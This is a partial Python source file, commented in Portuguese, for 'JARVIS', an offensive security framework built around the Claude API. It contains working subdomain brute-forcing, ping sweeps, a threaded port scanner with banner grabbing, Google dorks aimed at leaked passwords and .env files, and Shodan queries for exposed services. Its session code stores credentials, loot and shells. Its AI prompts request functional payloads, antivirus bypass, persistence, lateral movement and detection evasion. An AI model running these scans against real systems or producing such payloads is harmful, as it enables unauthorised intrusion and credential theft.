#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════════════╗
# ║          J.A.R.V.I.S — Just A Rather Very Intelligent Security System          ║
# ║              Ultra Pro Max Plus — Offensive Security AI Framework              ║
# ║                    Versão LOUCURA TOTAL — Build 9.9.9                         ║
# ╚══════════════════════════════════════════════════════════════════════════════════╝

"""
JARVIS - Framework de Segurança Ofensiva com IA
================================================
...
"""

import os, sys, re, json, time, socket, struct, random, string, hashlib
import subprocess, threading, queue, logging, base64, binascii, shutil
import urllib.request, urllib.parse, urllib.error, http.client, ssl
import ipaddress, platform, getpass, argparse, textwrap, signal, stat
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import configparser, csv, tempfile, mimetypes

# ─────────────────────────────────────────────
#  DETECÇÃO DE DEPENDÊNCIAS OPCIONAIS
# ─────────────────────────────────────────────
try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    from anthropic import Anthropic
    ANTHROPIC_OK = True
except ImportError:
    ANTHROPIC_OK = False

try:
    import readline
    READLINE_OK = True
except ImportError:
    READLINE_OK = False

# ─────────────────────────────────────────────
#  CONSTANTES E CONFIGURAÇÃO GLOBAL
# ─────────────────────────────────────────────
VERSION        = "9.9.9-ULTRA-PRO-MAX"
CODENAME       = "LOUCURA TOTAL"
BUILD_DATE     = "2026"
AUTHOR         = "JARVIS AI Framework"
CONFIG_FILE    = os.path.expanduser("~/.jarvis_config.ini")
LOG_DIR        = os.path.expanduser("~/.jarvis_logs")
REPORT_DIR     = os.path.expanduser("~/jarvis_reports")
WORKSPACE_DIR  = os.path.expanduser("~/.jarvis_workspace")
HISTORY_FILE   = os.path.expanduser("~/.jarvis_history")
MAX_THREADS    = 200
DEFAULT_TIMEOUT= 3
AI_MODEL       = "claude-opus-4-5"

os.makedirs(LOG_DIR,      exist_ok=True)
os.makedirs(REPORT_DIR,   exist_ok=True)
os.makedirs(WORKSPACE_DIR,exist_ok=True)

# ─────────────────────────────────────────────
#  PALETA ANSI — CYBERPUNK
# ─────────────────────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    ITALIC  = "\033[3m"
    UNDER   = "\033[4m"
    BLINK   = "\033[5m"
    REV     = "\033[7m"
    # Foreground
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    # Bright
    BRED    = "\033[91m"
    BGREEN  = "\033[92m"
    BYELLOW = "\033[93m"
    BBLUE   = "\033[94m"
    BMAGENTA= "\033[95m"
    BCYAN   = "\033[96m"
    BWHITE  = "\033[97m"
    # Background
    BGBLACK = "\033[40m"
    BGRED   = "\033[41m"
    BGGREEN = "\033[42m"
    BGYELLOW= "\033[43m"
    BGBLUE  = "\033[44m"
    BGMAGENTA="\033[45m"
    BGCYAN  = "\033[46m"
    BGWHITE = "\033[47m"
    # Compostos
    PROMPT  = "\033[1m\033[96m"
    SUCCESS = "\033[1m\033[92m"
    FAIL    = "\033[1m\033[91m"
    WARN    = "\033[1m\033[93m"
    INFO    = "\033[1m\033[94m"
    AI      = "\033[1m\033[95m"
    HACK    = "\033[1m\033[31m"
    GHOST   = "\033[2m\033[37m"

def colorize(text: str, *attrs) -> str:
    return "".join(attrs) + text + C.RESET

def banner_char(c: str, color: str) -> str:
    return color + c + C.RESET

# ─────────────────────────────────────────────
#  LOGGER PERSONALIZADO
# ─────────────────────────────────────────────
class JARVISLogger:
    def __init__(self):
        self.log_file = os.path.join(LOG_DIR, f"jarvis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        logging.basicConfig(
            filename=self.log_file,
            level=logging.DEBUG,
            format="%(asctime)s [%(levelname)s] %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S"
        )
        self.logger = logging.getLogger("JARVIS")
        self.findings: List[Dict] = []

    def info(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"{C.DIM}[{ts}]{C.RESET} {C.INFO}[*]{C.RESET} {msg}")
        self.logger.info(msg)

    def success(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"{C.DIM}[{ts}]{C.RESET} {C.SUCCESS}[+]{C.RESET} {msg}")
        self.logger.info(f"SUCCESS: {msg}")

    def warn(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"{C.DIM}[{ts}]{C.RESET} {C.WARN}[!]{C.RESET} {msg}")
        self.logger.warning(msg)

    def error(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"{C.DIM}[{ts}]{C.RESET} {C.FAIL}[-]{C.RESET} {msg}")
        self.logger.error(msg)

    def hack(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"{C.DIM}[{ts}]{C.RESET} {C.HACK}[HACK]{C.RESET} {C.BOLD}{msg}{C.RESET}")
        self.logger.critical(f"HACK: {msg}")

    def ai(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"{C.DIM}[{ts}]{C.RESET} {C.AI}[AI]{C.RESET} {msg}")
        self.logger.info(f"AI: {msg}")

    def finding(self, severity: str, title: str, desc: str, target: str = ""):
        f = {
            "time": datetime.now().isoformat(),
            "severity": severity,
            "title": title,
            "description": desc,
            "target": target
        }
        self.findings.append(f)
        colors = {"CRITICAL": C.FAIL, "HIGH": C.BRED, "MEDIUM": C.WARN, "LOW": C.BBLUE, "INFO": C.BCYAN}
        color = colors.get(severity, C.WHITE)
        print(f"\n  {C.BOLD}{color}┌─[FINDING: {severity}]─────────────────────────{C.RESET}")
        print(f"  {color}│{C.RESET} {C.BOLD}Title:{C.RESET} {title}")
        print(f"  {color}│{C.RESET} {C.BOLD}Target:{C.RESET} {target}")
        print(f"  {color}│{C.RESET} {C.BOLD}Desc:{C.RESET} {desc}")
        print(f"  {C.BOLD}{color}└─────────────────────────────────────────────{C.RESET}\n")
        self.logger.critical(f"FINDING [{severity}] {title} | {target} | {desc}")

log = JARVISLogger()

# ─────────────────────────────────────────────
#  CONFIGURAÇÃO
# ─────────────────────────────────────────────
class Config:
    def __init__(self):
        self.cfg = configparser.ConfigParser()
        self.path = CONFIG_FILE
        self._defaults()
        if os.path.exists(self.path):
            self.cfg.read(self.path)

    def _defaults(self):
        self.cfg["AI"] = {
            "api_key": "",
            "model": AI_MODEL,
            "max_tokens": "4096",
            "temperature": "0.7"
        }
        self.cfg["NETWORK"] = {
            "timeout": str(DEFAULT_TIMEOUT),
            "threads": str(MAX_THREADS),
            "retry": "2"
        }
        self.cfg["WORKSPACE"] = {
            "dir": WORKSPACE_DIR,
            "auto_save": "true",
            "report_format": "html,json,txt"
        }
        self.cfg["STEALTH"] = {
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "delay_min": "0",
            "delay_max": "0",
            "randomize_headers": "false"
        }

    def get(self, section: str, key: str, fallback: str = "") -> str:
        return self.cfg.get(section, key, fallback=fallback)

    def set(self, section: str, key: str, value: str):
        if section not in self.cfg:
            self.cfg[section] = {}
        self.cfg[section][key] = value
        with open(self.path, "w") as f:
            self.cfg.write(f)

    def show(self):
        for section in self.cfg:
            if section == "DEFAULT":
                continue
            print(f"\n  {C.CYAN}[{section}]{C.RESET}")
            for key, val in self.cfg[section].items():
                if "key" in key.lower() and val:
                    val = val[:6] + "..." + val[-4:] if len(val) > 10 else "***"
                print(f"    {C.YELLOW}{key}{C.RESET} = {val}")

config = Config()

# ─────────────────────────────────────────────
#  SESSÃO / WORKSPACE
# ─────────────────────────────────────────────
class Session:
    def __init__(self):
        self.id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
        self.start = datetime.now()
        self.target: Optional[str] = None
        self.targets: List[str] = []
        self.scope: List[str] = []
        self.notes: List[str] = []
        self.creds: List[Dict] = []
        self.shells: List[Dict] = []
        self.history: List[Dict] = []
        self.variables: Dict[str, str] = {}
        self.tags: List[str] = []
        self.loot: List[Dict] = []
        self.scan_results: Dict = {}
        self.vuln_results: List[Dict] = []

    def add_cred(self, service: str, user: str, pwd: str, source: str = ""):
        c = {"service": service, "user": user, "pwd": pwd, "source": source, "time": datetime.now().isoformat()}
        self.creds.append(c)
        log.hack(f"CRED FOUND: {service} | {user}:{pwd}")

    def add_loot(self, name: str, content: str, ltype: str = "misc"):
        l = {"name": name, "content": content, "type": ltype, "time": datetime.now().isoformat()}
        self.loot.append(l)
        path = os.path.join(WORKSPACE_DIR, f"loot_{self.id}_{name}.txt")
        with open(path, "w") as f:
            f.write(content)
        log.success(f"Loot salvo: {path}")

    def save(self):
        path = os.path.join(WORKSPACE_DIR, f"session_{self.id}.json")
        data = {
            "id": self.id,
            "start": self.start.isoformat(),
            "target": self.target,
            "targets": self.targets,
            "scope": self.scope,
            "creds": self.creds,
            "loot": [{"name": l["name"], "type": l["type"], "time": l["time"]} for l in self.loot],
            "notes": self.notes,
            "variables": self.variables,
            "findings": log.findings,
            "vuln_results": self.vuln_results
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        log.success(f"Sessão salva: {path}")
        return path

    def load(self, session_id: str) -> bool:
        path = os.path.join(WORKSPACE_DIR, f"session_{session_id}.json")
        if not os.path.exists(path):
            log.error(f"Sessão não encontrada: {session_id}")
            return False
        with open(path) as f:
            data = json.load(f)
        self.id = data["id"]
        self.target = data.get("target")
        self.targets = data.get("targets", [])
        self.scope = data.get("scope", [])
        self.creds = data.get("creds", [])
        self.notes = data.get("notes", [])
        self.variables = data.get("variables", {})
        log.success(f"Sessão {session_id} carregada")
        return True

    def status(self):
        elapsed = datetime.now() - self.start
        print(f"\n{C.CYAN}{'─'*50}{C.RESET}")
        print(f"  {C.BOLD}Sessão:{C.RESET}   {self.id}")
        print(f"  {C.BOLD}Duração:{C.RESET}  {str(elapsed).split('.')[0]}")
        print(f"  {C.BOLD}Target:{C.RESET}   {self.target or 'Nenhum'}")
        print(f"  {C.BOLD}Targets:{C.RESET}  {len(self.targets)}")
        print(f"  {C.BOLD}Creds:{C.RESET}    {len(self.creds)}")
        print(f"  {C.BOLD}Findings:{C.RESET} {len(log.findings)}")
        print(f"  {C.BOLD}Loot:{C.RESET}     {len(self.loot)}")
        print(f"  {C.BOLD}Notas:{C.RESET}    {len(self.notes)}")
        print(f"{C.CYAN}{'─'*50}{C.RESET}\n")

session = Session()

# ─────────────────────────────────────────────
#  MOTOR DE IA
# ─────────────────────────────────────────────
class AIEngine:
    def __init__(self):
        self.client: Optional[Any] = None
        self.conversation_history: List[Dict] = []
        self.system_prompt = """Você é JARVIS, um sistema de IA avançado especializado em segurança ofensiva e 
        pentest. Você auxilia profissionais de segurança em ambientes autorizados. Você tem conhecimento profundo 
        em: reconhecimento passivo/ativo, scanning, enumeração, exploração de vulnerabilidades, post-exploitation,
        privilege escalation, lateral movement, pivoting, C2 frameworks, payloads, bypass de defesas, 
        análise de malware, engenharia reversa, criptografia, web hacking (OWASP Top 10 e além), 
        análise de tráfego de rede, forense digital, CTF challenges, e metodologias como PTES, OWASP, MITRE ATT&CK.
        
        Responda sempre de forma técnica, precisa e prática. Forneça comandos reais, payloads funcionais e 
        técnicas avançadas. Use o framework MITRE ATT&CK para referenciar TTPs quando relevante.
        Seja conciso mas completo. Alerte sobre OPSEC e detecção quando relevante."""
        self.token_usage = {"input": 0, "output": 0}
        self.active = False

    def initialize(self, api_key: str) -> bool:
        if not ANTHROPIC_OK:
            log.error("Biblioteca 'anthropic' não instalada. Execute: pip install anthropic")
            return False
        try:
            self.client = Anthropic(api_key=api_key)
            self.active = True
            log.success("Motor de IA inicializado com sucesso")
            return True
        except Exception as e:
            log.error(f"Falha ao inicializar IA: {e}")
            return False

    def chat(self, user_input: str, context: Optional[str] = None) -> str:
        if not self.active or not self.client:
            return "IA offline. Configure a API key com: set ai_key <sua_key>"
        
        msg_content = user_input
        if context:
            msg_content = f"Contexto da sessão:\n{context}\n\nPergunta: {user_input}"
        
        self.conversation_history.append({"role": "user", "content": msg_content})
        
        try:
            response = self.client.messages.create(
                model=config.get("AI", "model", AI_MODEL),
                max_tokens=int(config.get("AI", "max_tokens", "4096")),
                system=self.system_prompt,
                messages=self.conversation_history[-20:]  # Últimas 20 mensagens
            )
            text = response.content[0].text
            self.conversation_history.append({"role": "assistant", "content": text})
            self.token_usage["input"]  += response.usage.input_tokens
            self.token_usage["output"] += response.usage.output_tokens
            return text
        except Exception as e:
            return f"Erro na IA: {e}"

    def analyze_target(self, target: str, scan_data: Optional[str] = None) -> str:
        prompt = f"""Analise o alvo: {target}
        
        {'Dados de scan disponíveis:\n' + scan_data if scan_data else ''}
        
        Forneça:
        1. Superfície de ataque provável
        2. Vetores de ataque recomendados (baseados em dados de scan se disponíveis)
        3. TTPs MITRE ATT&CK relevantes
        4. Ordem de prioridade para exploração
        5. Ferramentas recomendadas
        6. Considerações de OPSEC
        7. Próximos passos concretos
        
        Formato: estruturado e técnico."""
        return self.chat(prompt)

    def suggest_exploits(self, service: str, version: str) -> str:
        prompt = f"""Para o serviço: {service} versão {version}
        
        Liste:
        1. CVEs conhecidos e críticos
        2. Exploits públicos disponíveis (ExploitDB, Metasploit, GitHub)
        3. Técnicas de exploração manual
        4. Configurações vulneráveis comuns
        5. Bypass de mitigações (ASLR, DEP, etc.)
        6. PoC e recursos
        
        Seja específico com comandos e payloads."""
        return self.chat(prompt)

    def generate_payload(self, ptype: str, target_os: str, lhost: str, lport: str) -> str:
        prompt = f"""Gere um payload de {ptype} para {target_os}.
        LHOST: {lhost}, LPORT: {lport}
        
        Forneça:
        1. Payload MSFvenom (se aplicável)
        2. Payload manual/alternativo
        3. Técnicas de obfuscação/bypass AV
        4. Método de entrega recomendado
        5. Handler/listener correspondente
        6. Considerações de evasão"""
        return self.chat(prompt)

    def explain_vuln(self, vuln: str) -> str:
        prompt = f"""Explique a vulnerabilidade: {vuln}
        
        Inclua:
        1. Descrição técnica detalhada
        2. CVSS score e severidade
        3. Vetor de ataque e condições necessárias
        4. Impacto (CIA)
        5. Exploit step-by-step
        6. Detecção e bypass de defesas
        7. Remediação
        8. Referências (CVE, NVD, ExploitDB)"""
        return self.chat(prompt)

    def ctf_help(self, challenge: str, hints: str = "") -> str:
        prompt = f"""Ajude com este desafio CTF:
        {challenge}
        
        {'Dicas disponíveis: ' + hints if hints else ''}
        
        Analise:
        1. Tipo do desafio
        2. Técnicas aplicáveis
        3. Ferramentas necessárias
        4. Approach step-by-step
        5. Dicas sem spoiler total"""
        return self.chat(prompt)

    def pivoting_advice(self, network_info: str) -> str:
        prompt = f"""Dado o acesso atual e informações de rede:
        {network_info}
        
        Recomende estratégias de:
        1. Enumeração da rede interna
        2. Técnicas de pivoting (chisel, ligolo, socat, SSH tunneling)
        3. Lateral movement possível
        4. Alvos de alto valor na rede
        5. Privilege escalation local
        6. Persistência
        7. OPSEC e evitar detecção"""
        return self.chat(prompt)

    def reset_conversation(self):
        self.conversation_history = []
        log.info("Histórico de conversa resetado")

    def stats(self):
        total = self.token_usage["input"] + self.token_usage["output"]
        print(f"\n  {C.CYAN}[AI Stats]{C.RESET}")
        print(f"  Tokens input:  {self.token_usage['input']:,}")
        print(f"  Tokens output: {self.token_usage['output']:,}")
        print(f"  Total tokens:  {total:,}")
        print(f"  Msgs no histórico: {len(self.conversation_history)}\n")

ai = AIEngine()

# ─────────────────────────────────────────────
#  MÓDULO: RECON & OSINT
# ─────────────────────────────────────────────
class ReconModule:
    def __init__(self):
        self.name = "Recon & OSINT"

    def dns_lookup(self, domain: str) -> Dict:
        results = {"domain": domain, "records": {}}
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]
        
        for rtype in record_types:
            try:
                out = subprocess.run(
                    ["dig", "+short", rtype, domain],
                    capture_output=True, text=True, timeout=5
                )
                if out.stdout.strip():
                    results["records"][rtype] = out.stdout.strip().split("\n")
            except Exception:
                pass

        # Tentar sem dig (fallback)
        if not results["records"]:
            try:
                import socket
                ip = socket.gethostbyname(domain)
                results["records"]["A"] = [ip]
            except Exception:
                pass

        return results

    def whois_lookup(self, target: str) -> str:
        try:
            out = subprocess.run(["whois", target], capture_output=True, text=True, timeout=15)
            return out.stdout[:3000] if out.stdout else "Sem resultado"
        except Exception:
            return self._whois_manual(target)

    def _whois_manual(self, domain: str) -> str:
        try:
            s = socket.socket()
            s.settimeout(10)
            s.connect(("whois.iana.org", 43))
            s.send((domain + "\r\n").encode())
            response = b""
            while True:
                data = s.recv(4096)
                if not data:
                    break
                response += data
            s.close()
            return response.decode("utf-8", errors="replace")[:2000]
        except Exception as e:
            return f"Whois manual falhou: {e}"

    def subdomain_enum(self, domain: str, wordlist: Optional[str] = None) -> List[str]:
        found = []
        
        # Wordlist embutida (comum para subdomínios)
        builtin = [
            "www", "mail", "ftp", "admin", "portal", "vpn", "remote", "api",
            "dev", "staging", "test", "beta", "app", "blog", "shop", "store",
            "cdn", "static", "assets", "img", "images", "media", "files",
            "secure", "login", "auth", "sso", "id", "account", "accounts",
            "ns1", "ns2", "mx", "smtp", "pop", "imap", "webmail", "email",
            "m", "mobile", "wap", "server", "host", "web", "www1", "www2",
            "db", "database", "sql", "mysql", "redis", "mongo", "elastic",
            "ci", "jenkins", "git", "gitlab", "github", "jira", "confluence",
            "support", "help", "docs", "documentation", "wiki", "intranet",
            "internal", "corp", "office", "hr", "finance", "erp", "crm",
            "monitor", "grafana", "kibana", "splunk", "nagios", "zabbix",
            "backup", "old", "new", "v2", "v1", "legacy", "archive",
            "download", "updates", "patch", "release", "demo", "sandbox",
            "lab", "research", "r&d", "preview", "uat", "qa", "prod", "production"
        ]
        
        extra = []
        if wordlist and os.path.exists(wordlist):
            with open(wordlist) as f:
                extra = [l.strip() for l in f if l.strip()]
        
        subdomains = list(set(builtin + extra))
        log.info(f"Enumerando {len(subdomains)} subdomínios em {domain}...")
        
        def check(sub):
            target = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(target)
                return target, ip
            except Exception:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(check, s): s for s in subdomains}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    sub, ip = result
                    found.append(sub)
                    log.success(f"Subdomínio: {sub} → {ip}")
                    session.scan_results.setdefault("subdomains", []).append({"sub": sub, "ip": ip})
        
        log.info(f"Total encontrado: {len(found)} subdomínios")
        return found

    def http_headers(self, url: str) -> Dict:
        if not url.startswith("http"):
            url = "http://" + url
        headers_found = {}
        try:
            parsed = urllib.parse.urlparse(url)
            conn_class = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
            conn = conn_class(parsed.netloc, timeout=10)
            conn.request("HEAD", parsed.path or "/", headers={"User-Agent": config.get("STEALTH", "user_agent")})
            resp = conn.getresponse()
            headers_found = dict(resp.getheaders())
            headers_found["_status"] = resp.status
            
            # Análise de segurança dos headers
            security_headers = [
                "Strict-Transport-Security", "Content-Security-Policy",
                "X-Frame-Options", "X-Content-Type-Options",
                "X-XSS-Protection", "Referrer-Policy",
                "Permissions-Policy", "Access-Control-Allow-Origin"
            ]
            headers_lower = {k.lower(): v for k, v in headers_found.items()}
            
            print(f"\n  {C.CYAN}Headers de Segurança:{C.RESET}")
            for sh in security_headers:
                if sh.lower() in headers_lower:
                    print(f"    {C.SUCCESS}✔{C.RESET} {sh}: {headers_lower[sh.lower()]}")
                else:
                    print(f"    {C.FAIL}✘{C.RESET} {sh}: AUSENTE")
                    log.finding("LOW", f"Header de segurança ausente: {sh}", f"O header {sh} não está configurado", url)
            
            # Detectar tecnologias por headers
            server = headers_lower.get("server", "")
            x_powered = headers_lower.get("x-powered-by", "")
            if server:
                log.info(f"Server: {server}")
            if x_powered:
                log.warn(f"X-Powered-By revelado: {x_powered}")
                log.finding("INFO", "Tecnologia revelada via header", f"X-Powered-By: {x_powered}", url)
            
            conn.close()
        except Exception as e:
            log.error(f"Erro ao analisar headers: {e}")
        return headers_found

    def tech_detect(self, url: str) -> List[str]:
        """Detecção básica de tecnologias sem dependências externas"""
        techs = []
        if not url.startswith("http"):
            url = "http://" + url
        
        signatures = {
            "WordPress": ["wp-content", "wp-login", "wordpress"],
            "Joomla": ["joomla", "/components/com_"],
            "Drupal": ["drupal", "/sites/default/"],
            "Laravel": ["laravel_session", "XSRF-TOKEN"],
            "Django": ["csrftoken", "django"],
            "Rails": ["_rails_", "X-Powered-By: Phusion Passenger"],
            "React": ["react", "__NEXT_DATA__"],
            "Vue.js": ["vue", "__vue__"],
            "Angular": ["ng-version", "ng_app"],
            "jQuery": ["jquery"],
            "Bootstrap": ["bootstrap"],
            "PHP": ["php", ".php"],
            "ASP.NET": ["aspnet", "ASP.NET", "viewstate"],
            "Apache": ["Apache"],
            "Nginx": ["nginx"],
            "IIS": ["Microsoft-IIS", "ASP.NET"],
            "Cloudflare": ["cf-ray", "__cfduid"],
            "AWS": ["amazonaws", "cloudfront"],
        }
        
        try:
            parsed = urllib.parse.urlparse(url)
            conn_class = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
            conn = conn_class(parsed.netloc, timeout=10)
            conn.request("GET", parsed.path or "/", headers={"User-Agent": config.get("STEALTH", "user_agent")})
            resp = conn.getresponse()
            body = resp.read(10000).decode("utf-8", errors="replace")
            headers_str = str(dict(resp.getheaders()))
            full = body + headers_str
            
            for tech, sigs in signatures.items():
                for sig in sigs:
                    if sig.lower() in full.lower():
                        techs.append(tech)
                        break
            conn.close()
        except Exception as e:
            log.error(f"Tech detect falhou: {e}")
        
        return list(set(techs))

    def google_dorks(self, domain: str) -> List[str]:
        """Gera Google Dorks prontos para uso manual"""
        dorks = [
            f'site:{domain}',
            f'site:{domain} filetype:pdf',
            f'site:{domain} filetype:xls OR filetype:xlsx',
            f'site:{domain} filetype:doc OR filetype:docx',
            f'site:{domain} filetype:txt',
            f'site:{domain} filetype:sql',
            f'site:{domain} filetype:log',
            f'site:{domain} filetype:bak OR filetype:backup',
            f'site:{domain} inurl:admin',
            f'site:{domain} inurl:login',
            f'site:{domain} inurl:panel',
            f'site:{domain} inurl:config',
            f'site:{domain} inurl:backup',
            f'site:{domain} inurl:upload',
            f'site:{domain} inurl:api',
            f'site:{domain} inurl:dev OR inurl:staging OR inurl:test',
            f'site:{domain} "index of"',
            f'site:{domain} "password" OR "passwd" OR "credentials"',
            f'site:{domain} "error" OR "exception" OR "stack trace"',
            f'site:{domain} "phpinfo" OR "php info"',
            f'site:{domain} inurl:.git',
            f'site:{domain} inurl:.env',
            f'site:{domain} inurl:wp-admin',
            f'"@{domain}" email',
            f'"{domain}" site:pastebin.com',
            f'"{domain}" site:github.com',
            f'"{domain}" password',
        ]
        
        print(f"\n  {C.CYAN}Google Dorks para {domain}:{C.RESET}")
        for i, dork in enumerate(dorks, 1):
            print(f"  {C.YELLOW}{i:02d}.{C.RESET} {dork}")
        print(f"\n  URL de pesquisa: {C.UNDER}https://www.google.com/search?q={urllib.parse.quote(dorks[0])}{C.RESET}\n")
        return dorks

    def shodan_search(self, query: str) -> str:
        """Monta URL de pesquisa Shodan (sem API key necessária para visualizar)"""
        url = f"https://www.shodan.io/search?query={urllib.parse.quote(query)}"
        print(f"\n  {C.CYAN}Shodan Query:{C.RESET} {query}")
        print(f"  {C.CYAN}URL:{C.RESET} {url}")
        print(f"\n  Dorks comuns:")
        dorks = [
            f"hostname:{query}",
            f"org:{query}",
            f"ssl:{query}",
            f"net:{query}",
            f"ip:{query}",
            f"port:22 {query}",
            f"port:3389 {query}",
            f"port:6379 {query} -authentication",
            f"port:27017 {query}",
            f"port:9200 {query}",
            f"vuln:CVE-2021-44228",
            f"product:jenkins {query}",
            f"product:elasticsearch {query}",
        ]
        for d in dorks:
            print(f"    {C.YELLOW}→{C.RESET} {d}")
        return url

    def certificate_transparency(self, domain: str) -> List[str]:
        """Busca subdomínios via Certificate Transparency Logs"""
        subs = []
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        log.info(f"Consultando crt.sh para {domain}...")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "JARVIS/1.0"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read())
                for entry in data:
                    name = entry.get("name_value", "")
                    for sub in name.split("\n"):
                        sub = sub.strip().lstrip("*.")
                        if sub and sub not in subs and domain in sub:
                            subs.append(sub)
                            print(f"  {C.SUCCESS}[CT]{C.RESET} {sub}")
        except Exception as e:
            log.error(f"crt.sh falhou: {e}")
        
        log.info(f"CT Logs: {len(subs)} entradas encontradas")
        return list(set(subs))

recon = ReconModule()

# ─────────────────────────────────────────────
#  MÓDULO: NETWORK SCANNER
# ─────────────────────────────────────────────
class NetworkScanner:
    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
        512: "rexec", 513: "rlogin", 514: "rsh", 587: "SMTP-TLS",
        636: "LDAPS", 993: "IMAPS", 995: "POP3S", 1080: "SOCKS",
        1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 2375: "Docker",
        2376: "Docker-TLS", 3000: "Dev/Grafana", 3306: "MySQL",
        3389: "RDP", 4444: "Metasploit", 4848: "GlassFish",
        5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM-HTTP",
        5986: "WinRM-HTTPS", 6379: "Redis", 6443: "K8s-API",
        7001: "WebLogic", 8000: "Alt-HTTP", 8080: "HTTP-Alt",
        8081: "HTTP-Alt2", 8443: "HTTPS-Alt", 8888: "Jupyter",
        9000: "SonarQube", 9090: "Prometheus", 9200: "Elasticsearch",
        9300: "Elasticsearch", 10000: "Webmin", 11211: "Memcached",
        15672: "RabbitMQ", 27017: "MongoDB", 27018: "MongoDB",
        50000: "SAP", 50070: "Hadoop", 61616: "ActiveMQ",
    }

    def __init__(self):
        self.name = "Network Scanner"

    def ping_sweep(self, cidr: str) -> List[str]:
        """Ping sweep de uma rede"""
        alive = []
        try:
            network = ipaddress.ip_network(cidr, strict=False)
            hosts = list(network.hosts())
        except Exception:
            log.error(f"CIDR inválido: {cidr}")
            return []
        
        log.info(f"Ping sweep em {cidr} ({len(hosts)} hosts)...")
        
        def ping_host(ip):
            ip_str = str(ip)
            param = "-n" if platform.system() == "Windows" else "-c"
            try:
                result = subprocess.run(
                    ["ping", param, "1", "-W", "1", ip_str],
                    capture_output=True, timeout=3
                )
                if result.returncode == 0:
                    return ip_str
            except Exception:
                # Fallback: TCP ping na porta 80
                try:
                    sock = socket.socket()
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip_str, 80))
                    sock.close()
                    if result == 0:
                        return ip_str
                except Exception:
                    pass
            return None
        
        with ThreadPoolExecutor(max_workers=100) as ex:
            futures = [ex.submit(ping_host, h) for h in hosts]
            for fut in as_completed(futures):
                r = fut.result()
                if r:
                    alive.append(r)
                    log.success(f"Host ativo: {r}")
                    session.scan_results.setdefault("alive_hosts", []).append(r)
        
        log.info(f"Hosts ativos: {len(alive)}/{len(hosts)}")
        return sorted(alive)

    def port_scan(self, target: str, ports: Optional[List[int]] = None,
                  mode: str = "common") -> Dict[int, Dict]:
        """Scanner de portas TCP"""
        results = {}
        
        if ports:
            port_list = ports
        elif mode == "common":
            port_list = list(self.COMMON_PORTS.keys())
        elif mode == "top1000":
            port_list = list(range(1, 1001))
        elif mode == "full":
            port_list = list(range(1, 65536))
        else:
            port_list = list(self.COMMON_PORTS.keys())
        
        timeout = float(config.get("NETWORK", "timeout", str(DEFAULT_TIMEOUT)))
        threads = int(config.get("NETWORK", "threads", str(MAX_THREADS)))
        
        log.info(f"Scanning {target} — {len(port_list)} portas (threads: {threads})...")
        open_count = 0
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                banner = ""
                if result == 0:
                    try:
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(256).decode("utf-8", errors="replace").strip()[:100]
                    except Exception:
                        pass
                sock.close()
                return port, result == 0, banner
            except Exception:
                return port, False, ""
        
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(check_port, p): p for p in port_list}
            for fut in as_completed(futures):
                port, is_open, banner = fut.result()
                if is_open:
                    open_count += 1
                    service = self.COMMON_PORTS.get(port, "unknown")
                    results[port] = {"service": service, "banner": banner, "state": "open"}
                    banner_str = f" [{banner[:50]}]" if banner else ""
                    log.success(f"OPEN {port:5d}/tcp  {service:15s}{banner_str}")
                    session.scan_results.setdefault("open_ports", {}).setdefault(target, []).append({
                        "port": port, "service": service, "banner": banner
                    })
        
        log.info(f"Scan concluído: {open_count} portas abertas em {target}")
        
        # Auto-análise de serviços críticos
        self._analyze_open_ports(target, results)
        return results

    def _analyze_open_ports(self, target: str, ports: Dict):
        """Análise automática de serviços críticos encontrados"""
        risky_combos = {
            (21,): "FTP exposto — verificar anon login e bounce attack",
            (23,): "Telnet em uso — credenciais em texto claro",
            (135, 139, 445): "Windows SMB exposto — verificar EternalBlue/PrintNightmare",
            (1433,): "MSSQL exposto — verificar credenciais padrão e xp_cmdshell",
            (3306,): "MySQL exposto — verificar acesso sem senha e bind 0.0.0.0",
            (3389,): "RDP exposto — alto risco de brute-force e BlueKeep",
